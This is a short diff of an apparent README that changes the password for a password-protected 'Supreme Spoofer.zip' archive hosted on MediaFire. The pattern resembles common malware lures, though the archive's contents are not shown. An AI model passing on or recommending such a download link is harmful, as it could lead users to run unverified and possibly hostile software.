@@ -1,7 +1,7 @@
 
 
 ***DOWNLOAD*** :arrow_heading_down:
-|[Click to Download](https://www.mediafire.com/file/8duok00kgjm0w5x/Supreme+Spoofer.zip/file)|Password: 5033|
+|[Click to Download](https://www.mediafire.com/file/8duok00kgjm0w5x/Supreme+Spoofer.zip/file)|Password: 123|
 |---|---|
 
 ```
